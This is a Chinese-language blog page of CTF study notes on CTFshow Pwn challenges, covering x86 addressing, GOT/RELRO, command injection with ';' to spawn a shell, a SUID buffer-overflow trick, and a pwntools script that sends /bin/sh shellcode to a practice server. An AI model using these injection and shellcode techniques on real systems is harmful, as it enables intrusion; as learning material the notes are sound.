@@ -1,0 +1,470 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>学习笔记 - CTFshow_Pwn知识精炼 | Colin</title><meta name="author" content="Colin"><meta name="copyright" content="Colin"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="本博文为CTFshow中Pwn系列的做题笔记和知识总结,用于记录本人摸索二进制世界的历程">
+<meta property="og:type" content="article">
+<meta property="og:title" content="学习笔记 - CTFshow_Pwn知识精炼">
+<meta property="og:url" content="http://example.com/2026/04/12/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%20-%20CTFshow_Pwn%E7%9F%A5%E8%AF%86%E7%B2%BE%E7%82%BC(%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0%E4%B8%AD)/index.html">
+<meta property="og:site_name" content="Colin">
+<meta property="og:description" content="本博文为CTFshow中Pwn系列的做题笔记和知识总结,用于记录本人摸索二进制世界的历程">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://avatars.githubusercontent.com/u/256901064?s=400&u=57ab83cada0314c38a33d0615d653723b26b68d3&v=4">
+<meta property="article:published_time" content="2026-04-12T11:15:00.000Z">
+<meta property="article:modified_time" content="2026-04-12T12:09:11.793Z">
+<meta property="article:author" content="Colin">
+<meta property="article:tag" content="CTF">
+<meta property="article:tag" content="Pwn">
+<meta property="article:tag" content="学习笔记">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://avatars.githubusercontent.com/u/256901064?s=400&u=57ab83cada0314c38a33d0615d653723b26b68d3&v=4"><script type="application/ld+json">{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "学习笔记 - CTFshow_Pwn知识精炼",
+  "url": "http://example.com/2026/04/12/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%20-%20CTFshow_Pwn%E7%9F%A5%E8%AF%86%E7%B2%BE%E7%82%BC(%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0%E4%B8%AD)/",
+  "image": "https://avatars.githubusercontent.com/u/256901064?s=400&u=57ab83cada0314c38a33d0615d653723b26b68d3&v=4",
+  "datePublished": "2026-04-12T11:15:00.000Z",
+  "dateModified": "2026-04-12T12:09:11.793Z",
+  "author": [
+    {
+      "@type": "Person",
+      "name": "Colin",
+      "url": "http://example.com"
+    }
+  ]
+}</script><link rel="shortcut icon" href="https://avatars.githubusercontent.com/u/256901064?s=400&u=57ab83cada0314c38a33d0615d653723b26b68d3&v=4"><link rel="canonical" href="http://example.com/2026/04/12/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%20-%20CTFshow_Pwn%E7%9F%A5%E8%AF%86%E7%B2%BE%E7%82%BC(%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0%E4%B8%AD)/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css?v=5.5.4"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@7.1.0/css/all.min.css"><script>
+    (() => {
+      
+    const saveToLocal = {
+      set: (key, value, ttl) => {
+        if (!ttl) return
+        const expiry = Date.now() + ttl * 86400000
+        localStorage.setItem(key, JSON.stringify({ value, expiry }))
+      },
+      get: key => {
+        const itemStr = localStorage.getItem(key)
+        if (!itemStr) return undefined
+        const { value, expiry } = JSON.parse(itemStr)
+        if (Date.now() > expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return value
+      }
+    }
+
+    window.btf = {
+      saveToLocal,
+      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
+        script.onload = script.onreadystatechange = () => {
+          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
+        }
+        script.onerror = reject
+        document.head.appendChild(script)
+      }),
+      getCSS: (url, id) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onload = link.onreadystatechange = () => {
+          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
+        }
+        link.onerror = reject
+        document.head.appendChild(link)
+      }),
+      addGlobalFn: (key, fn, name = false, parent = window) => {
+        if (!true && key.startsWith('pjax')) return
+        const globalFn = parent.globalFn || {}
+        globalFn[key] = globalFn[key] || {}
+        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
+        parent.globalFn = globalFn
+      }
+    }
+  
+      
+      const activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      const activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+
+      btf.activateDarkMode = activateDarkMode
+      btf.activateLightMode = activateLightMode
+
+      const theme = saveToLocal.get('theme')
+    
+          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
+        
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
+      }
+    
+      
+    const detectApple = () => {
+      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+  
+    })()
+  </script><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"/search.xml","preload":true,"top_n_per_article":1,"unescape":true,"pagination":{"enable":false,"hitsPerPage":8},"languages":{"hits_empty":"未找到符合您查询的内容：${query}","hits_stats":"共找到 ${hits} 篇文章"}},
+  translate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":true},
+  copy: {
+    success: '复制成功',
+    error: '复制失败',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'null',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid@4.13.0/dist/infinitegrid.min.js',
+    buttonText: '加载更多'
+  },
+  isPhotoFigcaption: false,
+  islazyloadPlugin: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: '学习笔记 - CTFshow_Pwn知识精炼',
+  isHighlightShrink: false,
+  isToc: true,
+  pageType: 'post'
+}</script><link rel="stylesheet" href="/css/custom.css"><script src="/js/random-subtitle.js"></script><meta name="generator" content="Hexo 8.1.1"></head><body><div class="bg-animation" id="web_bg" style="background-image: url(/images/littleblogwallpaper.jpg);"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="https://avatars.githubusercontent.com/u/256901064?s=400&amp;u=57ab83cada0314c38a33d0615d653723b26b68d3&amp;v=4" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data text-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">4</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">16</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">3</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/todo/"><i class="fa-fw fas fa-check-square"></i><span> 待办</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url(/images/littleblogwallpaper.jpg);"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><img class="site-icon" src="/images/logo.png" alt="Logo"><span class="site-name">Colin</span></a><a class="nav-page-title" href="/"><span class="site-name">学习笔记 - CTFshow_Pwn知识精炼</span><span class="site-name"><i class="fa-solid fa-circle-arrow-left"></i><span>  返回首页</span></span></a></span><div id="menus"><div id="search-button"><span class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> 搜索</span></span></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/todo/"><i class="fa-fw fas fa-check-square"></i><span> 待办</span></a></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">学习笔记 - CTFshow_Pwn知识精炼</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2026-04-12T11:15:00.000Z" title="发表于 2026-04-12 19:15:00">2026-04-12</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2026-04-12T12:09:11.793Z" title="更新于 2026-04-12 20:09:11">2026-04-12</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E7%AC%94%E8%AE%B0/">笔记</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">浏览量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>本博文为CTFshow中Pwn系列的做题笔记和知识总结,用于记录本人摸索二进制世界的历程<br>没啥好说的,<strong>干就完了</strong>  </p>
+<h1 id="前置基础"><a href="#前置基础" class="headerlink" title="前置基础"></a>前置基础</h1><h2 id="Pwn5-12——计组基础："><a href="#Pwn5-12——计组基础：" class="headerlink" title="Pwn5-12——计组基础："></a>Pwn5-12——计组基础：</h2><p>题目附件给出的信息十分重要</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">section .data</span><br><span class="line">    msg db &quot;Welcome_to_CTFshow_PWN&quot;, 0</span><br><span class="line">section .text</span><br><span class="line">    global _start</span><br><span class="line">_start:</span><br><span class="line">; 立即寻址方式</span><br><span class="line">    mov eax, 11         ; 将11赋值给eax</span><br><span class="line">    add eax, 114504     ; eax加上114504</span><br><span class="line">    sub eax, 1          ; eax减去1</span><br><span class="line">; 寄存器寻址方式</span><br><span class="line">    mov ebx, 0x36d      ; 将0x36d赋值给ebx</span><br><span class="line">    mov edx, ebx        ; 将ebx的值赋值给edx</span><br><span class="line">; 直接寻址方式</span><br><span class="line">    mov ecx, msg      ; 将msg的地址赋值给ecx</span><br><span class="line">; 寄存器间接寻址方式</span><br><span class="line">    mov esi, msg        ; 将msg的地址赋值给esi</span><br><span class="line">    mov eax, [esi]      ; 将esi所指向的地址的值赋值给eax</span><br><span class="line">; 寄存器相对寻址方式</span><br><span class="line">    mov ecx, msg        ; 将msg的地址赋值给ecx</span><br><span class="line">    add ecx, 4          ; 将ecx加上4</span><br><span class="line">    mov eax, [ecx]      ; 将ecx所指向的地址的值赋值给eax</span><br><span class="line">; 基址变址寻址方式</span><br><span class="line">    mov ecx, msg        ; 将msg的地址赋值给ecx</span><br><span class="line">    mov edx, 2          ; 将2赋值给edx</span><br><span class="line">    mov eax, [ecx + edx*2]  ; 将ecx+edx*2所指向的地址的值赋值给eax</span><br><span class="line">; 相对基址变址寻址方式</span><br><span class="line">    mov ecx, msg        ; 将msg的地址赋值给ecx</span><br><span class="line">    mov edx, 1          ; 将1赋值给edx</span><br><span class="line">    add ecx, 8          ; 将ecx加上8</span><br><span class="line">    mov eax, [ecx + edx*2 - 6]  ; 将ecx+edx*2-6所指向的地址的值赋值给eax</span><br><span class="line"></span><br><span class="line">; 输出字符串</span><br><span class="line">    mov eax, 4          ; 系统调用号4代表输出字符串</span><br><span class="line">    mov ebx, 1          ; 文件描述符1代表标准输出</span><br><span class="line">    mov ecx, msg        ; 要输出的字符串的地址</span><br><span class="line">    mov edx, 22         ; 要输出的字符串的长度</span><br><span class="line">    int 0x80            ; 调用系统调用</span><br><span class="line">; 退出程序</span><br><span class="line">    mov eax, 1          ; 系统调用号1代表退出程序</span><br><span class="line">    xor ebx, ebx        ; 返回值为0</span><br><span class="line">    int 0x80            ; 调用系统调用</span><br></pre></td></tr></table></figure>
+
+<p>总结：<br><img src="/images/blog4(ctfshow_pwn)/image1.png" alt="chart_1"></p>
+<h3 id="1-寄存器（CPU-的贴身口袋）"><a href="#1-寄存器（CPU-的贴身口袋）" class="headerlink" title="1. 寄存器（CPU 的贴身口袋）"></a>1. 寄存器（CPU 的贴身口袋）</h3><ul>
+<li><p><strong>EAX (累加器)</strong>：头号办事员。装返回值、做加减乘除、装系统调用号。</p>
+</li>
+<li><p><strong>EBX, ECX, EDX</strong>：办事材料袋。系统调用时，专门用来递交第 1、2、3 个参数。</p>
+</li>
+<li><p><strong>ESI, EDI (变址)</strong>：人形指针。专门指向内存地址，负责数据的搬运。</p>
+</li>
+</ul>
+<h3 id="2-寻址方式（找东西的套路）"><a href="#2-寻址方式（找东西的套路）" class="headerlink" title="2. 寻址方式（找东西的套路）"></a>2. 寻址方式（找东西的套路）</h3><p>唯一核心看懂 <code>[]</code>（中括号等于“开门取物”）：</p>
+<ul>
+<li><p><strong>无 <code>[]</code></strong>（如 <code>*mov ecx, msg*</code>）：把 门牌号（内存地址） 揣进口袋。</p>
+</li>
+<li><p><strong>有 <code>[]</code></strong>（如 <code>*mov eax, [ecx]*</code>）：按着门牌号去找，开门把里面的东西 拿出来。</p>
+</li>
+<li><p><strong>复合寻址</strong>（如 [<code>ecx + edx*2 - 6]</code>）：小区大门(ecx) + 楼层(edx*2) + 微调退几步(-6) &#x3D; 最终开门取物。</p>
+</li>
+</ul>
+<h3 id="3-系统调用（int-0x80-办事大厅）"><a href="#3-系统调用（int-0x80-办事大厅）" class="headerlink" title="3. 系统调用（int 0x80 办事大厅）"></a>3. 系统调用（int 0x80 办事大厅）</h3><p>这是 32 位 Linux 呼叫内核干活的固定套路：</p>
+<ul>
+<li><p><strong>EAX 装指令</strong>：想打印填 4，想退出填 1。</p>
+</li>
+<li><p><strong>其他口袋装材料</strong>：比如把屏幕代号、字符串地址、长度分别塞进 EBX、ECX、EDX。</p>
+</li>
+<li><p><strong>按呼叫铃</strong>：执行 <code>int 0x80</code>，系统瞬间接管帮你办妥。</p>
+</li>
+</ul>
+<blockquote>
+<p><strong>补充</strong>：小端序中高字节存高地址，低字节存低地址。若想让程序读入 <code>0xdeadbeef</code> 去覆盖返回地址，用 Python 构造 Payload 时必须倒着敲：<code>\xef\xbe\xad\xde</code>。</p>
+</blockquote>
+<h2 id="Pwn13-16-——gcc编译的初步运用"><a href="#Pwn13-16-——gcc编译的初步运用" class="headerlink" title="Pwn13-16 ——gcc编译的初步运用"></a>Pwn13-16 ——gcc编译的初步运用</h2><p>对于 <code>.c</code> 结尾的 C 语言文件，或者 <code>.s</code> 结尾的汇编文件，GCC 原生支持。只要敲一行命令 <code>gcc 源码 -o 程序名</code> 就能成功编译。</p>
+<p>但是对于 <code>.asm</code> 结尾的汇编文件，要先用 <code>nasm</code> 把代码翻译成半成品的 <code>.o</code> 文件，再用 <code>ld</code> 工具把半成品拼装成真正的程序（例如先 <code>nasm -f elf flag.asm -o flag.o</code>，再 <code>ld -m elf_i386 -o flag flag.o</code>）。</p>
+<p><strong>补充：</strong></p>
+<ul>
+<li><p><strong>nasm: 常用汇编器(NASM)命令</strong></p>
+<ul>
+<li><p><code>-f elf</code>: 指定输出格式为 ELF，这是 Linux 常用的目标文件格式。</p>
+</li>
+<li><p><code>flag.asm</code>: 输入的汇编源代码文件。</p>
+</li>
+<li><p><code>-o flag.o</code>: 指定输出的目标文件名。</p>
+</li>
+</ul>
+</li>
+<li><p><strong>ld: GNU 链接器命令</strong></p>
+<ul>
+<li><p><code>-m elf_i386</code>: 指定生成 32 位架构的 ELF 格式可执行文件。</p>
+</li>
+<li><p><code>-o flag</code>: 指定输出的可执行文件名。</p>
+</li>
+<li><p><code>flag.o</code>: 输入的目标文件。</p>
+</li>
+</ul>
+</li>
+</ul>
+<p><strong>其他常见输出格式：</strong></p>
+<ul>
+<li><p><code>-f bin</code>: 生成纯二进制文件。</p>
+</li>
+<li><p><code>-f win32</code>: 生成 Windows 平台目标文件。</p>
+</li>
+<li><p><code>-f macho</code>: 生成 Mac OS X 目标文件。</p>
+</li>
+</ul>
+<blockquote>
+<p><strong>踩坑点</strong>：如果源码中存在文件读取操作（如 <code>fopen(&quot;key&quot;, &quot;rb&quot;)</code>），必须在同级目录提前构造好文件。应该写 <code>echo -n &quot;CTFshow&quot; &gt; key</code>，不写 <code>-n</code> 会额外引入换行符，破坏底层数据纯净度。</p>
+</blockquote>
+<h2 id="Pwn17——命令拼接注入"><a href="#Pwn17——命令拼接注入" class="headerlink" title="Pwn17——命令拼接注入"></a>Pwn17——命令拼接注入</h2><p><strong>思路</strong>：IDA 查看附件，发现出题人在 <code>dest</code> 里面放了 <code>&quot;ls /&quot;</code>。或许让用户输入一个目录名（比如 <code>tmp</code>），拼成 <code>&quot;ls /tmp&quot;</code>，然后用 <code>system()</code> 看目录里有什么。但使用了 <code>strcat</code> 来暴力拼接字符，我们只需使用分号 <code>;</code> 隔断，再输入 <code>sh</code> 便可提取 shell。</p>
+<p><strong>补充：常用注入连接符 (Linux)</strong></p>
+<ul>
+<li><p><code>;</code>：按顺序执行多条命令。</p>
+</li>
+<li><p><code>&amp;&amp;</code>：前面命令执行成功，才执行后面命令。</p>
+</li>
+<li><p><code>||</code>：前面命令执行失败，才执行后面命令。</p>
+</li>
+<li><p><code>|</code>（管道）：将前面命令的输出作为后面命令的输入。</p>
+</li>
+</ul>
+<p><em>(踩坑点：本题通过注入弹出的 shell 是盲终端，没有 <code>ctfshow@ubuntu:~$</code> 提示符。可以通过 <code>ls</code> 或 <code>whoami</code> 测试。此处无法通过键盘移动光标，回车键也无法正常发挥功能，键入时应确保无误)</em></p>
+<h2 id="pwn18-——-和-的辨析"><a href="#pwn18-——-和-的辨析" class="headerlink" title="pwn18 —— &gt;&gt; 和 &gt; 的辨析"></a>pwn18 —— <code>&gt;&gt;</code> 和 <code>&gt;</code> 的辨析</h2><table>
+<thead>
+<tr>
+<th></th>
+<th></th>
+</tr>
+</thead>
+<tbody><tr>
+<td><strong>符号</strong></td>
+<td><strong>作用</strong></td>
+</tr>
+<tr>
+<td><code>命令 &gt; 文件</code></td>
+<td>将标准输出重定向到文件中（清除原有文件中的数据）</td>
+</tr>
+<tr>
+<td><code>命令 &gt;&gt; 文件</code></td>
+<td>将标准输出重定向到文件中（在原有的内容后追加）</td>
+</tr>
+</tbody></table>
+<h2 id="Pwn19-——文件描述符与重定向"><a href="#Pwn19-——文件描述符与重定向" class="headerlink" title="Pwn19 ——文件描述符与重定向"></a>Pwn19 ——文件描述符与重定向</h2><p>当程序的标准输出（1 号文件描述符 stdout）被 <code>fclose()</code> 恶意关闭时，正常的 <code>cat</code> 无法回显。必须利用依然敞开的报错通道（2 号文件描述符 stderr），构造命令 <code>cat /flag 1&gt;&amp;2</code>，将输出数据强行拐弯塞进报错通道打印在屏幕上。</p>
+<p><strong>补充：文件描述符（0 &amp; 1 &amp; 2）</strong></p>
+<ul>
+<li><p>Linux 进程默认有 3 个缺省打开的文件描述符：标准输入 0 (stdin)，标准输出 1 (stdout)，标准错误 2 (stderr)。</p>
+</li>
+<li><p>0, 1, 2 对应的物理设备一般是：键盘、显示器、显示器。</p>
+</li>
+</ul>
+<h2 id="Pwn20-22-——RELRO保护机制与GOT表"><a href="#Pwn20-22-——RELRO保护机制与GOT表" class="headerlink" title="Pwn20-22 ——RELRO保护机制与GOT表"></a>Pwn20-22 ——RELRO保护机制与GOT表</h2><p>程序调用外部函数（如 <code>puts</code>、<code>system</code>）时，查阅底层的“内部通讯录”——即 <code>.got</code> 和 <code>.got.plt</code> 表（全局偏移表）。如果这两个表是可写的，我们就可以劫持 GOT 表。RELRO 保护机制就是为了把这个表锁定为只读。</p>
+<p>底层读取出的地址（如 <code>0000000000600f18</code>）带有大量补位的 0。实战中约定俗成做法是去掉前导零，并加上十六进制前缀 <code>0x</code>（即 <code>0x600f18</code>）。</p>
+<table>
+<thead>
+<tr>
+<th></th>
+<th></th>
+<th></th>
+</tr>
+</thead>
+<tbody><tr>
+<td><strong>RELRO 状态</strong></td>
+<td><strong>.got 运行权限</strong></td>
+<td><strong>.got.plt 运行权限</strong></td>
+</tr>
+<tr>
+<td>No RELRO</td>
+<td>1 (可写)</td>
+<td>1 (可写)</td>
+</tr>
+<tr>
+<td>Partial RELRO</td>
+<td>0 (只读)</td>
+<td>1 (可写)</td>
+</tr>
+<tr>
+<td>Full RELRO</td>
+<td>0 (只读)</td>
+<td>0 (只读&#x2F;不存在)</td>
+</tr>
+</tbody></table>
+<p><strong>踩坑点：</strong></p>
+<ul>
+<li><p><strong>readelf 命令的大小写</strong>：</p>
+<ul>
+<li><p><code>readelf -s</code>（小写）：查看符号表 (Symbols)。只能看到函数名和变量名。</p>
+</li>
+<li><p><code>readelf -S</code>（大写）：查看节头表 (Section Headers)。这才能找到内存块地址 (Addr) 和权限旗标 (Flg)。</p>
+</li>
+</ul>
+</li>
+<li><p><strong>静态标志与运行环境优先级</strong>：</p>
+<ul>
+<li><p><code>readelf</code> (静态)：即使看到 <code>.got</code> 带有 WA 旗标，那也只是文件在硬盘上的静态属性。</p>
+</li>
+<li><p><code>checksec</code> (动态)：只要确认了 Full RELRO，运行时权限将覆盖静态权限。</p>
+</li>
+</ul>
+</li>
+</ul>
+<h2 id="Pwn23——命令行参数注入与SUID权限"><a href="#Pwn23——命令行参数注入与SUID权限" class="headerlink" title="Pwn23——命令行参数注入与SUID权限"></a>Pwn23——命令行参数注入与SUID权限</h2><p><strong>思路</strong>：程序一开始用 <code>fgets</code> 把 Flag 偷偷读进内存，然后留了一个会调用 <code>sigsegv_handler</code> 的 <code>signal(11)</code>。程序吃启动参数 (<code>argv[1]</code>)，并把它扔给了不检查长度的 <code>strcpy</code>。利用命令替换 <code>$()</code> 挂载超长字符串，把 <code>strcpy</code> “撑爆”，引发段错误触发 <code>signal(11)</code>，借助 <code>pwnme</code> 程序带有的 SUID 权限得到 flag。</p>
+<ul>
+<li><p><strong>SUID 权限（提权跳板）</strong>：当程序权限显示为 <code>-rwsr-sr-x</code>（带有 <code>s</code> 标志）且所有者为 root 时，进程会临时获得 root 权限。</p>
+</li>
+<li><p><strong>Signal 11（段错误与“复活甲”）</strong>：栈溢出覆盖返回地址后，抛出 SIGSEGV。若源码中有 <code>signal(11, handler)</code>，程序临死前会被拉去执行 handler 逻辑。</p>
+</li>
+</ul>
+<table>
+<thead>
+<tr>
+<th></th>
+<th></th>
+<th></th>
+</tr>
+</thead>
+<tbody><tr>
+<td><strong>维度</strong></td>
+<td><strong>标准输入 (stdin)</strong></td>
+<td><strong>命令行参数 (argv)</strong></td>
+</tr>
+<tr>
+<td><strong>C 语言源码特征</strong></td>
+<td>使用 <code>scanf()</code>, <code>gets()</code>, <code>read()</code>, <code>fgets(..., stdin)</code></td>
+<td>在 main 函数中通过 <code>int main(int argc, char **argv)</code> 接收。核心是处理 <code>argv[1]</code>。</td>
+</tr>
+<tr>
+<td><strong>正常人怎么用</strong></td>
+<td>终端输入 <code>./pwnme</code> -&gt; 提示录入 -&gt; 敲字 -&gt; 回车。</td>
+<td>终端输入 <code>./pwnme AAAA</code> 直接回车。</td>
+</tr>
+<tr>
+<td><strong>黑客注入手法</strong></td>
+<td>管道符 &#96;</td>
+<td><code>或 输入重定向</code>&lt;&#96;</td>
+</tr>
+<tr>
+<td><strong>攻击模板</strong></td>
+<td>&#96;python3 -c “print(‘A’*200)”</td>
+<td>.&#x2F;pwnme&#96;</td>
+</tr>
+<tr>
+<td><strong>Linux 底层跑法</strong></td>
+<td>终端同时跑两个进程，建立管道。</td>
+<td>终端先跑 Python 拿到结果，再拼成完整命令执行。</td>
+</tr>
+<tr>
+<td><strong>错误下场</strong></td>
+<td>喂错给 argv 程序：管道撑爆，报错 <code>BrokenPipeError</code>。</td>
+<td>喂错给 stdin 程序：Payload 被当成杂项忽略，程序傻等键盘。</td>
+</tr>
+<tr>
+<td><strong>进阶补充</strong></td>
+<td>菜单题必须上 <code>pwntools</code> 库交互。</td>
+<td>如果包含空格或特殊字符，会被切断。实战通常不考虑，因为打的是机器码。</td>
+</tr>
+</tbody></table>
+<h2 id="Pwn24-——-pwntools-初步利用（shellcraft）"><a href="#Pwn24-——-pwntools-初步利用（shellcraft）" class="headerlink" title="Pwn24 —— pwntools 初步利用（shellcraft）"></a>Pwn24 —— pwntools 初步利用（shellcraft）</h2><p><strong>思路</strong>：没开 NX，静态分析发现读取后直接执行 <code>call eax</code>，而 <code>eax</code> 指向 <code>buf</code> 首地址。利用 <code>shellcraft</code> 自动编写 shellcode。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&#x27;i386&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>) </span><br><span class="line"><span class="comment"># 32位 CPU 听不懂 64位机器码。告诉兵工厂：“我要打的是 32位 (i386) 的 Linux 靶机”。</span></span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&#x27;pwn.challenge.ctf.show&#x27;</span>, <span class="number">28291</span>)</span><br><span class="line"></span><br><span class="line">shellcode = asm(shellcraft.sh())</span><br><span class="line"><span class="comment"># 1. shellcraft.sh()：自动写出调出 /bin/sh 的汇编。</span></span><br><span class="line"><span class="comment"># 2. asm(...)：翻译成十六进制机器码 (Shellcode)。</span></span><br><span class="line"></span><br><span class="line">p.sendline(shellcode)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<h2 id="PWN25——Ret2libc初步利用"><a href="#PWN25——Ret2libc初步利用" class="headerlink" title="PWN25——Ret2libc初步利用"></a>PWN25——Ret2libc初步利用</h2><p><strong>思路</strong>：开了 NX 保护，利用程序自带函数库攻击。泄露函数真实地址，利用 <code>LibcSearcher</code> 搜索 <code>system</code> 和 <code>/bin/sh</code> 地址。</p>
+<h4 id="获取偏移值"><a href="#获取偏移值" class="headerlink" title="获取偏移值"></a>获取偏移值</h4><ol>
+<li><p><code>gdb ./pwn</code></p>
+</li>
+<li><p><code>cyclic 200 &gt; pattern</code></p>
+</li>
+<li><p><code>run &lt; pattern</code></p>
+</li>
+<li><p>段错误时执行 <code>info register eip</code> 得到 <code>0x6261616b</code></p>
+</li>
+<li><p><code>cyclic -l 0x6261616b</code> 得到偏移量</p>
+</li>
+</ol>
